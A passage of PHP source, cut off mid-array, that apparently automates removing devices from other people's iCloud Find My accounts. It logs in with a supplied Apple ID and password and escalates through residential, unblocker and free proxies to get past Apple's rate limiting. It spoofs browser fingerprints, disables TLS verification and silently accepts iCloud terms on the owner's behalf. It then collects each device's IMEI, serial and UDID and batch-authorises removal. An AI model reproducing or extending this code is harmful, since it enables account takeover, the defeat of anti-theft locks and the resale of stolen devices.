function authenticate(string $apple_id, string $password, array $cfg): array
{
    global $STATS, $last_success_mode;
    $consecutive_fails = 0;
    $result = null;
    $used_method = 'direct'; // track which method was actually used
    $escalation = build_escalation_chain($cfg);
    $chain_labels = array_map(fn($e) => $e['label'], $escalation);
    emit_log('debug', '  🔗 Chain: ' . implode(' → ', $chain_labels));

    foreach ($escalation as $step) {
        if ($consecutive_fails < $step['trigger_after_503'])
            continue;

        for ($attempt = 0; $attempt < $step['retries']; $attempt++) {
            // Progressive delay
            if ($consecutive_fails > 0) {
                $base_delay = min(5, 1.0 * pow(1.3, $consecutive_fails));
                $jitter = mt_rand(20, 80) / 100;
                $wait = $base_delay + $jitter;
                $wait_str = number_format($wait, 1);
                emit_log('warning', "  ⏳ Fail #{$consecutive_fails} — waiting {$wait_str}s before {$step['label']}");
                usleep((int)($wait * 1000000));
            }

            $proxy = get_proxy_url($step['mode'], $cfg);

            // Determine the connection method label
            $mode = $step['mode'];
            if ($mode === 'unblocker') {
                $used_method = 'site_unblocker';
            }
            elseif ($mode === 'residential' || $mode === 'proxy') {
                $used_method = 'proxy';
            }
            elseif ($mode === 'free_proxy') {
                $used_method = 'free_proxy';
            }
            elseif ($mode === 'gitproxy') {
                $used_method = 'gitproxy';
            }
            else {
                $used_method = 'direct';
            }

            $result = auth_attempt($apple_id, $password, $cfg, $proxy);
            $sc = $result['status_code'];

            if ($sc === 503 || $sc === null || $sc === 0) {
                $consecutive_fails++;
                if ($sc === 503) {
                    $STATS['errors_503']++;
                    emit_log('warning', "  🔴 503 #{$consecutive_fails} via {$step['label']}");
                }
                else {
                    $msg = substr($result['error_message'] ?? '', 0, 60);
                    emit_log('warning', "  🔴 Connection fail #{$consecutive_fails} via {$step['label']}: {$msg}");
                }
                continue;
            }

            // Definitive result
            if ($sc === 200 || $sc === 409) {
                $last_success_mode = $step['mode'];
            }
            $result['connection_method'] = $used_method;
            return $result;
        }
    }

    if ($result) {
        emit_log('error', "  💀 All attempts failed ({$consecutive_fails} failures)");
    }
    $final = $result ?? ['success' => false, 'status' => 'failed', 'status_code' => null, 'tokens' => [], 'error_message' => "All {$consecutive_fails} attempts failed"];
    $final['connection_method'] = $used_method;
    return $final;
}

// ============================================================================
// iCLOUD TERMS AUTO-ACCEPT
// ----------------------------------------------------------------------------
// Mirrors the auto-accept flow in web/app/webroot/fmi/DeviceService.php and
// in this directory's request.php. Apple periodically forces a fresh iCloud
// terms acceptance on the account (silent POST /repairDone with an
// `acceptedICloudTerms` id). When they do, refreshClient comes back empty /
// non-200 / with a `termsNotAccepted` marker, and the remove flow bricks
// with a useless "refreshClient HTTP X".
//
// Helpers below (a) log every step of the terms decision to
// app/tmp/logs/apple/terms_accept.log, (b) probe the current terms id
// dynamically from Apple's own rejection body, and (c) drive a silent
// repairDone POST + refreshClient retry so the caller never sees the wall.
// Guarded with function_exists() so loading this file alongside request.php
// under the same interpreter (rare but possible) does not redefine.
// ============================================================================

if (!function_exists('req_terms_log')) {

    function req_terms_log(string $msg): void
    {
        $path = function_exists('ilog_file')
            ? ilog_file('apple', 'terms_accept.log')
            : sys_get_temp_dir() . '/apple_terms_accept.log';
        @file_put_contents($path, '[' . date('c') . '] ' . $msg . "\n", FILE_APPEND | LOCK_EX);
    }

    function req_needs_terms_acceptance($client): ?string
    {
        if (!is_array($client) || empty($client)) {
            return 'client_null_or_empty';
        }
        if (empty($client['serverContext'])) {
            return 'missing_serverContext';
        }
        if (isset($client['statusCode'])
            && in_array((string)$client['statusCode'], ['421', '450'], true)) {
            return 'statusCode_' . $client['statusCode'];
        }
        $flat = @json_encode($client);
        if ($flat !== false) {
            $lower = strtolower($flat);
            if (strpos($lower, 'termsnotaccepted') !== false) return 'kw_termsnotaccepted';
            if (strpos($lower, 'repairdone')       !== false) return 'kw_repairdone';
            if (strpos($lower, 'accepted_terms')   !== false) return 'kw_accepted_terms';
        }
        return null;
    }

    function req_extract_terms_id($resp): ?int
    {
        if (!is_array($resp) || empty($resp)) return null;
        $keys = ['termsId','iCloudTermsId','latestTermsId','latestTerms',
                 'iCloudTerms','acceptedICloudTerms','requiredTermsId'];
        $q = [$resp]; $seen = 0;
        while ($q && $seen < 500) {
            $n = array_shift($q); $seen++;
            if (!is_array($n)) continue;
            foreach ($keys as $k) {
                if (isset($n[$k]) && is_scalar($n[$k])
                    && ctype_digit((string)$n[$k]) && (int)$n[$k] > 0) {
                    req_terms_log('_extractTermsId: found id=' . (int)$n[$k] . " via key={$k}");
                    return (int)$n[$k];
                }
            }
            foreach ($n as $v) if (is_array($v)) $q[] = $v;
        }
        foreach (['location','redirectUrl','redirect_url'] as $u) {
            if (!empty($resp[$u])
                && preg_match('/[?&]acceptedICloudTerms=(\d+)/', (string)$resp[$u], $m)) {
                req_terms_log('_extractTermsId: found id=' . (int)$m[1] . " via url_param on {$u}");
                return (int)$m[1];
            }
        }
        $topKeys = is_array($resp) ? implode(',', array_keys($resp)) : 'not-array';
        req_terms_log("_extractTermsId: no id found nodes_scanned={$seen} top_keys=[{$topKeys}]");
        return null;
    }

    function req_extract_prs_id(array $login_result, string $cookie_jar): string
    {
        $prsId = (string)($login_result['dsInfo']['dsid'] ?? '');
        if ($prsId !== '') return $prsId;
        if (file_exists($cookie_jar)) {
            $raw = @file_get_contents($cookie_jar);
            if ($raw !== false
                && preg_match('/X-APPLE-WEBAUTH-USER[^\n]*?d=(\d+)/', $raw, $m)) {
                return $m[1];
            }
        }
        return '';
    }

    function req_build_terms_acceptance_request(string $prsId, string $clientId, int $termsId): array
    {
        return [
            'url' => 'https://setup.icloud.com/setup/ws/1/repairDone?' . http_build_query([
                'clientBuildNumber'     => '2634Build25',
                'clientMasteringNumber' => '2634Build25',
                'clientId'              => $clientId,
                'dsid'                  => $prsId,
            ]),
            'payload' => json_encode(['acceptedICloudTerms' => $termsId]),
        ];
    }

    /**
     * Open a new accountLogin session after repairDone. The FMIP cookies that
     * received HTTP 450 remain rejected even though the account terms were
     * accepted, so refreshClient must not reuse that old session.
     */
    function req_renew_icloud_session(
        string $loginUrl,
        string $loginPayload,
        array $headers,
        string $cookieJar,
        ?callable $requester = null
    ): array {
        $requester = $requester ?? 'curl_session_request';
        $response = $requester('POST', $loginUrl, $loginPayload, $headers, null, 20, $cookieJar);
        $status = (int)($response['status'] ?? 0);
        $loginResult = json_decode((string)($response['body'] ?? ''), true);

        if ($status !== 200) {
            return ['ok' => false, 'error' => "accountLogin HTTP {$status}", 'response' => $response];
        }
        if (!is_array($loginResult) || isset($loginResult['error'])) {
            return ['ok' => false, 'error' => 'accountLogin returned an invalid session', 'response' => $response];
        }

        $server = (string)($loginResult['webservices']['findme']['url'] ?? '');
        if ($server === '') {
            return ['ok' => false, 'error' => 'accountLogin did not return a findme server', 'response' => $response];
        }

        return [
            'ok' => true,
            'error' => null,
            'response' => $response,
            'login_result' => $loginResult,
            'server' => $server,
        ];
    }

    function req_accept_icloud_terms(string $prsId, string $clientId, string $cookie_jar, ?int $termsId): bool
    {
        if ($clientId === '' || $prsId === '') {
            req_terms_log('accept precheck failed:'
                . ' clientId=' . ($clientId !== '' ? substr($clientId, 0, 8) . '...' : 'EMPTY')
                . ' prsId=' . ($prsId !== '' ? $prsId : 'EMPTY'));
            return false;
        }

        $idsToTry = [];
        if ($termsId !== null && $termsId > 0) $idsToTry[] = (string)$termsId;
        $idsToTry[] = '634501';
        $idsToTry[] = '628501';
        $idsToTry = array_values(array_unique($idsToTry));

        $initialRequest = req_build_terms_acceptance_request($prsId, $clientId, (int)$idsToTry[0]);
        $url = $initialRequest['url'];

        $headers = [
            'Host: setup.icloud.com',
            'Connection: keep-alive',
            'sec-ch-ua-platform: "Windows"',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'sec-ch-ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
            'Content-Type: text/plain;charset=UTF-8',
            'sec-ch-ua-mobile: ?0',
            'Accept: */*',
            'Origin: https://www.icloud.com',
            'Sec-Fetch-Site: same-site',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            'Referer: https://www.icloud.com/',
            'Accept-Encoding: gzip, deflate, br, zstd',
            'Accept-Language: es',
        ];

        req_terms_log('=== repairDone flow start ==='
            . ' clientId=' . substr($clientId, 0, 24) . '...'
            . ' prsId=' . $prsId
            . ' initial_ids=[' . implode(',', $idsToTry) . ']'
            . ' url=' . $url);

        foreach ($idsToTry as $tryId) {
            $request = req_build_terms_acceptance_request($prsId, $clientId, (int)$tryId);
            $payload = $request['payload'];
            $resp    = curl_session_request('POST', $request['url'], $payload, $headers, null, 20, $cookie_jar);
            $body    = (string)($resp['body']   ?? '');
            $http    = (int)   ($resp['status'] ?? 0);
            $err     = (string)($resp['error']  ?? '');
            $data    = json_decode($body, true);
            $ok      = is_array($data) && isset($data['success']) && $data['success'] === true;

            req_terms_log('repairDone attempt'
                . " id={$tryId}"
                . " http={$http}"
                . ' curl_err=' . ($err !== '' ? $err : 'none')
                . ' parsed_success=' . ($ok ? 'true' : 'false')
                . ' payload=' . $payload
                . ' body_len=' . strlen($body)
                . ' body=' . substr(preg_replace('/\s+/', ' ', $body), 0, 3000));

            if ($ok) {
                req_terms_log("=== repairDone flow OK — accepted with id={$tryId} ===");
                return true;
            }

            $discovered = req_extract_terms_id($data);
            if ($discovered !== null && !in_array((string)$discovered, $idsToTry, true)) {
                $idsToTry[] = (string)$discovered;
                req_terms_log("discovered new termsId={$discovered} from rejection body — appended to queue");
            }
        }

        req_terms_log('=== repairDone flow EXHAUSTED — tried ids=['
            . implode(',', $idsToTry) . '] ===');
        return false;
    }
}

// ============================================================================
// AUTO REMOVE — Native PHP (exact port of Python AppleDeviceRemover)
// ============================================================================
$ICLOUD_LOGIN_HEADERS = [
    'Host: setup.icloud.com',
    'Connection: keep-alive',
    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
    'sec-ch-ua-platform: "Windows"',
    'sec-ch-ua-mobile: ?0',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'Content-Type: text/plain;charset=UTF-8',
    'Accept: */*',
    'Origin: https://www.icloud.com',
    'Sec-Fetch-Site: same-site',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://www.icloud.com/',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
];

function fmip_headers(string $cookies, string $content_type = 'application/json'): array
{
    return [
        'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept: */*',
        'Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
        'Accept-Encoding: gzip, deflate, br',
        "Content-Type: {$content_type}",
        'Origin: https://www.icloud.com',
        'Connection: keep-alive',
        'Referer: https://www.icloud.com/',
        "Cookie: {$cookies}",
    ];
}

/**
 * Fetch the per-account device list from iCloud's setup web service.
 * This endpoint exposes IMEI, serial number, UDID, model display name,
 * activation lock state and other deep device metadata that the FMIP
 * `refreshClient` response does NOT include.
 *
 * Returns an array of device entries (associative). On failure returns
 * an empty array; never throws.
 *
 * Strategy for the base URL:
 *   1. If login_result.webservices.account.url is set  derive from it.
 *   2. Otherwise derive from findme.url's p-prefix (p33-, p38-, etc.).
 *   3. Last resort: plain https://setup.icloud.com.
 */
function fetch_account_devices(array $login_result, string $cookie_jar): array
{
    // ── Derive setup base ──
    $base = '';
    $accountUrl = $login_result['webservices']['account']['url']
               ?? $login_result['webservices']['setup']['url']
               ?? '';
    if (!empty($accountUrl)) {
        $parts = parse_url($accountUrl);
        if (!empty($parts['scheme']) && !empty($parts['host'])) {
            $base = $parts['scheme'] . '://' . $parts['host'];
        }
    }
    if (empty($base)) {
        $findmeUrl = $login_result['webservices']['findme']['url'] ?? '';
        if (!empty($findmeUrl)) {
            $host = parse_url($findmeUrl, PHP_URL_HOST);
            // findme is e.g. p33-fmipmobile.icloud.com  setup is p33-setup.icloud.com
            if ($host && preg_match('/^p(\d+)-/', $host, $m)) {
                $base = 'https://p' . $m[1] . '-setup.icloud.com';
            }
        }
    }
    if (empty($base)) $base = 'https://setup.icloud.com';

    $url = $base . '/setup/web/device/getDevices?';

    // POST with empty body, cookies auto-sent from jar.
    // The endpoint accepts an empty POST body.
    $resp = curl_session_request('POST', $url, '', fmip_headers(''), null, 10, $cookie_jar);
    if (($resp['status'] ?? 0) !== 200 || empty($resp['body'])) return [];

    $data = json_decode($resp['body'], true);
    if (!is_array($data) || empty($data['devices']) || !is_array($data['devices'])) return [];

    return $data['devices'];
}

/**
 * Build a lookup map from the account-devices response so each FMIP
 * device can be enriched. We index by multiple keys so matching works
 * even when one identifier is missing  in priority order:
 *
 *   1. udid               (most reliable)
 *   2. serialNumber       (very reliable)
 *   3. name|deviceClass   (uniqueness within an account is high)
 *   4. name               (last resort fallback)
 *
 * Returns ['by_udid' => [...], 'by_serial' => [...], 'by_name_class' => [...], 'by_name' => [...]].
 */
function index_account_devices(array $accountDevices): array
{
    $byUdid = []; $bySerial = []; $byNameClass = []; $byName = [];
    foreach ($accountDevices as $d) {
        if (!is_array($d)) continue;
        if (!empty($d['udid']))         $byUdid[strtolower($d['udid'])] = $d;
        if (!empty($d['serialNumber'])) $bySerial[strtoupper($d['serialNumber'])] = $d;
        $name  = trim($d['name'] ?? '');
        $klass = trim($d['deviceClass'] ?? '');
        if ($name !== '' && $klass !== '') {
            $byNameClass[strtolower($name . '|' . $klass)] = $d;
        }
        if ($name !== '' && !isset($byName[strtolower($name)])) {
            $byName[strtolower($name)] = $d;
        }
    }
    return [
        'by_udid'       => $byUdid,
        'by_serial'     => $bySerial,
        'by_name_class' => $byNameClass,
        'by_name'       => $byName,
    ];
}

/**
 * Find the matching account-device for a given FMIP device using the
 * indexes built by index_account_devices(). Returns null if no match.
 */
function match_account_device(array $fmipDevice, array $idx): ?array
{
    // FMIP `id` is sometimes the UDID  try that first.
    $cand = strtolower($fmipDevice['id'] ?? '');
    if ($cand !== '' && isset($idx['by_udid'][$cand])) return $idx['by_udid'][$cand];
    // Some FMIP responses carry serialNumber inline.
    $sn = strtoupper($fmipDevice['serialNumber'] ?? '');
    if ($sn !== '' && isset($idx['by_serial'][$sn])) return $idx['by_serial'][$sn];
    // Name + deviceClass (most accounts have unique pairs).
    $name  = strtolower(trim($fmipDevice['name'] ?? ''));
    $klass = strtolower(trim($fmipDevice['deviceClass'] ?? ''));
    if ($name !== '' && $klass !== '') {
        $key = $name . '|' . $klass;
        if (isset($idx['by_name_class'][$key])) return $idx['by_name_class'][$key];
    }
    // Name alone as last resort.
    if ($name !== '' && isset($idx['by_name'][$name])) return $idx['by_name'][$name];
    return null;
}

function extract_set_cookies(array $resp_headers): string
{
    $parts = [];
    foreach ($resp_headers as $k => $v) {
        if (strcasecmp($k, 'Set-Cookie') === 0) {
            foreach (explode(',', $v) as $segment) {
                $segment = trim($segment);
                if (strpos($segment, '=') !== false) {
                    $cookie_part = trim(explode(';', $segment)[0]);
                    if ($cookie_part && !in_array($cookie_part, $parts)) {
                        $parts[] = $cookie_part;
                    }
                }
            }
        }
    }
    return implode('; ', $parts);
}

/**
 * Ejecuta N requests POST en paralelo via curl_multi.
 * @param array $requests  [['url'=>..., 'body'=>..., 'headers'=>[...]], ...]
 * @param string $cookie_jar  Path al cookie jar compartido
 * @param int $timeout  Timeout por request
 * @return array  Respuestas indexadas igual que $requests: [['status'=>int, 'body'=>string], ...]
 */
function curl_multi_post_batch(array $requests, string $cookie_jar, int $timeout = 8, ?array $tls_profile = null): array
{
    $mh = curl_multi_init();
    $handles = [];

    foreach ($requests as $i => $req) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $req['url'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HEADER => false,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $req['body'],
            CURLOPT_HTTPHEADER => $req['headers'],
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_CONNECTTIMEOUT => 8,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_ENCODING => '',
            CURLOPT_COOKIEJAR => $cookie_jar,
            CURLOPT_COOKIEFILE => $cookie_jar,
        ]);
        apply_browser_tls_profile($ch, $tls_profile);
        curl_multi_add_handle($mh, $ch);
        $handles[$i] = $ch;
    }

    // Execute all in parallel
    $running = null;
    do {
        curl_multi_exec($mh, $running);
        if ($running > 0) {
            curl_multi_select($mh, 0.1);
        }
    } while ($running > 0);

    // Collect results
    $results = [];
    foreach ($handles as $i => $ch) {
        $body = curl_multi_getcontent($ch);
        $http_code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $results[$i] = ['status' => $http_code, 'body' => $body ?: ''];
        curl_multi_remove_handle($mh, $ch);
        curl_close($ch);
    }
    curl_multi_close($mh);

    return $results;
}

function autoremove_execute(string $apple_id, string $password, string $session_token, array $cfg): array
{
    global $STATS, $ICLOUD_LOGIN_HEADERS;
    $removal_id = substr(uniqid(), -8);
    $removal = ['id' => $removal_id, 'email' => $apple_id, 'time' => date('H:i:s'), 'status' => 'processing',
        'owner' => '', 'devices' => [], 'devices_count' => 0, 'removed_count' => 0, 'failed_count' => 0, 'error' => null];

    emit_log('removal', "🔄 AutoRemove → {$apple_id}");
    emit_log('debug', '  🔑 Token: ' . substr($session_token, 0, 30) . '...');

    // Shared cookie jar for entire remove flow (like Python requests.Session)
    $cookie_jar = tempnam(sys_get_temp_dir(), 'remove_');

    // Step 1: iCloud Login
    emit_log('removal', '  📡 Step 1: iCloud Login (setup.icloud.com)');
    $uuid = sprintf('%04x%04x-%04x-%04x-%04x-%04x%04x%04x',
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff),
        mt_rand(0, 0x0fff) | 0x4000, mt_rand(0, 0x3fff) | 0x8000,
        mt_rand(0, 0xffff), mt_rand(0, 0xffff), mt_rand(0, 0xffff));
    $login_url = ICLOUD_SETUP_URL . "?clientBuildNumber=2419Project41&clientMasteringNumber=2419B20&clientId={$uuid}";
    $login_payload = json_encode(['dsWebAuthToken' => $session_token, 'extended_login' => false]);

    $resp = curl_session_request('POST', $login_url, $login_payload, $ICLOUD_LOGIN_HEADERS, null, 12, $cookie_jar);
    emit_log('debug', "  ← Login HTTP {$resp['status']}");

    // Log raw accountLogin body — the auto-terms flow leans on dsInfo.dsid
    // for the repairDone dsid param, so knowing exactly what Apple returned
    // here is the first thing worth in a "terms failed" post-mortem.
    req_terms_log('accountLogin response'
        . ' http=' . (int)$resp['status']
        . ' body_len=' . strlen((string)($resp['body'] ?? ''))
        . ' body=' . substr(preg_replace('/\s+/', ' ', (string)($resp['body'] ?? '')), 0, 2500));

    if ($resp['status'] !== 200) {
        $removal['status'] = 'failed';
        $removal['error'] = "iCloud login HTTP {$resp['status']}";
        emit_log('error', "  ✗ iCloud login HTTP {$resp['status']}");
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }

    $login_result = json_decode($resp['body'], true);
    if (!$login_result || isset($login_result['error'])) {
        $removal['status'] = 'failed';
        $removal['error'] = 'iCloud login error';
        emit_log('error', '  ✗ iCloud login error');
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }

    $server = $login_result['webservices']['findme']['url'] ?? '';

    if (!$server) {
        $removal['status'] = 'failed';
        $removal['error'] = 'No findme server in response';
        emit_log('error', '  ✗ No findme server URL in response');
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }
    emit_log('debug', "  ✓ FindMe: {$server}");

    // Step 2: Refresh Client
    emit_log('removal', '  📡 Step 2: Refresh client (device list)');
    $refresh_url = "{$server}/fmipservice/client/web/refreshClient";
    $refresh_payload = json_encode([
        'clientContext' => [
            'appName' => 'iCloud Find (Web)', 'appVersion' => '2.0', 'apiVersion' => '3.0',
            'deviceListVersion' => 1, 'fmly' => true, 'timezone' => 'US/Pacific', 'inactiveTime' => 315,
        ]
    ]);

    // All requests use the shared cookie jar — cookies from login are auto-sent
    $resp = curl_session_request('POST', $refresh_url, $refresh_payload, fmip_headers('', 'text/plain'), null, 12, $cookie_jar);
    emit_log('debug', "  ← refreshClient HTTP {$resp['status']}");

    // Log full refreshClient response so a terms-wall diagnosis has the
    // exact body Apple sent — before deciding whether the response smells
    // like pending iCloud terms.
    $rc_body = (string)($resp['body'] ?? '');
    $rc_data = json_decode($rc_body, true);
    $rc_top  = is_array($rc_data) ? implode(',', array_keys($rc_data)) : 'not-array';
    req_terms_log('refreshClient response'
        . ' http=' . (int)$resp['status']
        . ' body_len=' . strlen($rc_body)
        . ' top_keys=[' . $rc_top . ']'
        . ' body=' . substr(preg_replace('/\s+/', ' ', $rc_body), 0, 3000));

    // Pending-terms probe. `req_needs_terms_acceptance` covers the JSON
    // signals (missing serverContext, statusCode 421/450, keyword markers);
    // a raw non-200 HTTP is treated as terms-suspect too so we still get a
    // repairDone attempt when Apple decides to reject at the transport
    // layer.
    $terms_reason = req_needs_terms_acceptance($rc_data);
    if ($terms_reason === null && $resp['status'] !== 200) {
        $terms_reason = 'http_' . (int)$resp['status'];
    }
    req_terms_log('_needsTermsAcceptance='
        . ($terms_reason !== null ? "true ({$terms_reason})" : 'false'));

    if ($terms_reason !== null) {
        emit_log('warning', "  ⚠️ Pending iCloud terms detected ({$terms_reason}) — auto-accepting");
        $terms_id = req_extract_terms_id($rc_data);
        $prs_id   = req_extract_prs_id($login_result, $cookie_jar);
        if (req_accept_icloud_terms($prs_id, $uuid, $cookie_jar, $terms_id)) {
            emit_log('success', '  ✓ Terms accepted — renewing iCloud session');
            req_terms_log('terms accepted; renewing accountLogin session before refreshClient');

            $renewal_url = ICLOUD_SETUP_URL;
            $fresh_session = req_renew_icloud_session(
                $renewal_url,
                $login_payload,
                $ICLOUD_LOGIN_HEADERS,
                $cookie_jar
            );
            if (!$fresh_session['ok']) {
                $reason = (string)$fresh_session['error'];
                req_terms_log('accountLogin renewal failed: ' . $reason);
                emit_log('error', '  ✗ Could not renew iCloud session after terms acceptance');
                $removal['status'] = 'failed';
                $removal['error'] = $reason;
                $STATS['autoremove_sent']++;
                @unlink($cookie_jar);
                return $removal;
            }

            $login_result = $fresh_session['login_result'];
            $server = $fresh_session['server'];
            $refresh_url = "{$server}/fmipservice/client/web/refreshClient";
            $resp    = curl_session_request('POST', $refresh_url, $refresh_payload, fmip_headers('', 'text/plain'), null, 12, $cookie_jar);
            $rc_body = (string)($resp['body'] ?? '');
            $rc_data = json_decode($rc_body, true);
            $rc_top  = is_array($rc_data) ? implode(',', array_keys($rc_data)) : 'not-array';
            emit_log('debug', "  ← refreshClient retry HTTP {$resp['status']}");
            req_terms_log('refreshClient retry response'
                . ' http=' . (int)$resp['status']
                . ' body_len=' . strlen($rc_body)
                . ' top_keys=[' . $rc_top . ']'
                . ' body=' . substr(preg_replace('/\s+/', ' ', $rc_body), 0, 3000));

            $retry_terms_reason = req_needs_terms_acceptance($rc_data);
            if ($retry_terms_reason === null && $resp['status'] !== 200) {
                $retry_terms_reason = 'http_' . (int)$resp['status'];
            }
            if ($retry_terms_reason !== null) {
                req_terms_log("fresh accountLogin session still reports pending terms ({$retry_terms_reason})");
                emit_log('error', '  ✗ Fresh iCloud session still reports pending terms');
                $removal['status'] = 'failed';
                $removal['error'] = 'Fresh iCloud session still reports pending terms';
                $STATS['autoremove_sent']++;
                @unlink($cookie_jar);
                return $removal;
            }
        } else {
            emit_log('error', '  ✗ iCloud terms acceptance failed — bailing');
            $removal['status'] = 'failed';
            $removal['error']  = 'iCloud terms acceptance failed';
            $STATS['autoremove_sent']++;
            @unlink($cookie_jar);
            return $removal;
        }
    }

    if ($resp['status'] !== 200) {
        $removal['status'] = 'failed';
        $removal['error'] = "refreshClient HTTP {$resp['status']}";
        emit_log('error', "  ✗ refreshClient HTTP {$resp['status']}");
        $STATS['autoremove_sent']++;
        @unlink($cookie_jar);
        return $removal;
    }

    // Cookies auto-managed by cookie jar — no manual accumulation needed

    $client_data = is_array($rc_data) ? $rc_data : [];
    $content = $client_data['content'] ?? [];
    $user_info = $client_data['userInfo'] ?? [];
    $owner = trim(($user_info['firstName'] ?? '') . ' ' . ($user_info['lastName'] ?? '')) ?: $apple_id;
    emit_log('debug', "  ✓ Devices: " . count($content) . " | User: {$owner}");

    // ── Step 2.5: Fetch deep device metadata (IMEI / SN / UDID etc.) ──
    // FMIP refreshClient gives us live state (battery, location, lostMode)
    // but does NOT carry IMEI, serial number, or UDID. The setup web
    // endpoint /setup/web/device/getDevices returns those, so we call it
    // with the same login cookies and merge the fields into the output
    // by matching name+deviceClass / serialNumber / udid.
    $account_devices = fetch_account_devices($login_result, $cookie_jar);
    $account_index   = index_account_devices($account_devices);
    if (!empty($account_devices)) {
        emit_log('debug', '  ✓ Account devices enriched: ' . count($account_devices));
    } else {
        emit_log('warning', '  ! Could not fetch account device metadata (IMEI/SN unavailable)');
    }

    // Step 3: Process devices in parallel (2 phases: auth batch → remove batch)
    $devices = [];
    $removed_count = 0;
    $total = count($content);
    $auth_url = "{$server}/fmipservice/client/web/authForUserDevice";
    $remove_url = "{$server}/fmipservice/client/web/remove";
    $hdrs = fmip_headers('');
    $server_stp = $login_result['webservices']['account']['url'] ?? '';
    $fb_prs_id = req_extract_prs_id($login_result, $cookie_jar);
    $sc_info = $client_data['serverContext']['info'] ?? '';
    $domain_orig = 'https://www.icloud.com';

    // ── Phase 1: Batch authForUserDevice ──
    emit_log('removal', "  🔐 Phase 1: Auth {$total} devices in parallel");
    $auth_requests = [];
    foreach ($content as $device) {
        $device_id = $device['id'] ?? '';
        $auth_requests[] = [
            'url' => $auth_url,
            'body' => json_encode(['device' => $device_id, 'authToken' => $password]),
            'headers' => $hdrs,
        ];
    }
    $auth_responses = curl_multi_post_batch($auth_requests, $cookie_jar, 8);

    // Parse auth tokens
    $auth_tokens = [];
    foreach ($auth_responses as $i => $resp) {
        $token = 'Invalid';
        if ($resp['status'] === 200) {
            $data = json_decode($resp['body'], true);
            $token = $data['authToken'] ?? 'Invalid';
        }
        $auth_tokens[$i] = $token;
    }

    // ── Fallback: DeviceService-style fmipWebAuthenticate if batch auth failed ──
    $valid_auth_count = count(array_filter($auth_tokens, fn($t) => $t !== 'Invalid'));
    if ($valid_auth_count === 0 && $total > 0) {
        emit_log('warning', "  ⚠️  Batch auth failed for all {$total} devices — fallback to fmipWebAuthenticate");
        $fb_auth_url = "{$server_stp}/setup/ws/1/fmipWebAuthenticate"
            . "?clientBuildNumber=2513Project44&clientMasteringNumber=2513B20"
            . "&clientId=" . urlencode($uuid)
            . "&dsid={$fb_prs_id}";
        $stp_host = parse_url($server_stp, PHP_URL_HOST);
        $fb_auth_headers = [
            "Host: {$stp_host}",
            'Connection: keep-alive',
            'sec-ch-ua-platform: "macOS"',
            'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36',
            'sec-ch-ua: "Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
            'Content-Type: text/plain',
            'sec-ch-ua-mobile: ?0',
            'Accept: */*',
            "Origin: {$domain_orig}",
            'Sec-Fetch-Site: same-site',
            'Sec-Fetch-Mode: cors',
            'Sec-Fetch-Dest: empty',
            "Referer: {$domain_orig}",
            'Accept-Encoding: gzip, deflate, br, zstd',
            'Accept-Language: es-419,es;q=0.9',
        ];
        $fb_auth_body = json_encode([
            'serverContext' => [
                'minCallbackIntervalInMS' => 5000,
                'pendingRemoveGracePeriodInDays' => 30,
                'preferredLanguage' => 'es-mx',
                'enable2FAFamilyActions' => false,
                'lastSessionExtensionTime' => null,
                'callbackIntervalInMS' => 10000,
                'enableMapStats' => true,
                'validRegion' => true,
                'timezone' => [
                    'currentOffset' => -25200000,
                    'previousTransition' => 1741514399999,
                    'previousOffset' => -28800000,
                    'tzCurrentName' => 'Pacific Daylight Time',
                    'tzName' => 'US/Pacific',
                ],
                'authToken' => null,
                'maxCallbackIntervalInMS' => 60000,
                'classicUser' => false,
                'isHSA' => true,
                'trackInfoCacheDurationInSecs' => 86400,
                'imageBaseUrl' => 'https://statici.icloud.com',
                'minTrackLocThresholdInMts' => 100,
                'itemLearnMoreURL' => 'https://support.apple.com/kb/HT211331?viewlocale=es_MX',
                'maxLocatingTime' => 90000,
                'itemsTabEnabled' => true,
                'sessionLifespan' => 900000,
                'info' => $sc_info,
                'prefsUpdateTime' => 1742972453373,
                'widgetFor1FA' => true,
                'useAuthWidget' => true,
                'clientId' => $uuid,
                'inaccuracyRadiusThreshold' => 200,
                'enable2FAFamilyRemove' => false,
                'serverTimestamp' => 1745886956814,
                'theftLoss' => null,
                'deviceImageVersion' => '33',
                'macCount' => 0,
                'deviceLoadStatus' => '200',
                'maxDeviceLoadTime' => 60000,
                'prsId' => $fb_prs_id,
                'showSllNow' => false,
                'cloudUser' => true,
                'enable2FAErase' => false,
                'id' => 'server_ctx',
            ],
            'clientContext' => [
                'appName' => 'iCloud Find (Web)',
                'appVersion' => '2.0',
                'apiVersion' => '3.0',
                'deviceListVersion' => 1,
                'fmly' => true,
                'timezone' => 'US/Pacific',
                'inactiveTime' => 7160,
            ],
            'dsWebAuthToken' => $session_token,
